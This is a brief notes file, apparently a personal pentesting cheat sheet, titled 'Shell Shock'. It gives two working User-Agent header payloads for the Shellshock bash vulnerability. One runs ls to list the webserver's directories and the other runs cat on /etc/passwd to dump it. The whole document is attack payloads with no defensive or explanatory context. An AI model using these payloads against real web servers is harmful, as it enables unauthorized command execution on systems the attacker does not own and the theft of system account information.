# Notes

Shell Shock

#List directories on webserver <br>
User-Agent: () { ignored;}; echo Content-type: text/plain;echo;echo $(/bin/ls); /bin/sleep 1

#Dump etc/passwd <br>
User-Agent: () { ignored;}; echo Content-type: text/plain;echo;echo $(/bin/cat /etc/passwd); /bin/sleep 1
